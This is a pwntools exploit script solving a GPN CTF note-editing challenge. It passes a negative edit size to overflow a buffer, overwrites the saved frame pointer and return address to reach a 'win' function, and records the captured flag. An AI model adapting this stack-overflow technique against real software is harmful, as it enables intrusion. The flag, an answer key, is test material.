from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall', '''
    b *0x401331
    b *0x401498
    b *0x40171d
    continue
''')

# p = remote("oldshire-of-preposterous-harmony.gpn23.ctf.kitctf.de", "443", ssl=True)

def append_note(note):
    p.sendlineafter(b"6. Quit\n", b'3')
    p.sendlineafter(b"bytes left):\n", note)

def edit_note(offset, size, note):
    p.sendlineafter(b"6. Quit\n", b'4')
    p.sendlineafter(b"start editing: ", str(offset).encode())
    p.sendlineafter(b"overwrite: ", str(size).encode())
    p.sendline(note)

def quit():
    p.sendlineafter(b"6. Quit\n", b'6')

BSS_FAKE_RBP = 0x404060
WIN_ADDR = 0x401221

append_note(b'A'*(0x400-2))
edit_note(0x0, -0xffffffff+0x430-1, b'B'*0x400+p64(BSS_FAKE_RBP)+b'C'*0x20+p64(WIN_ADDR))
quit()

p.interactive()

# GPNCTF{noW_Y0u_SuR3Ly_4re_READY_T0_PwN_laDy8IRd!}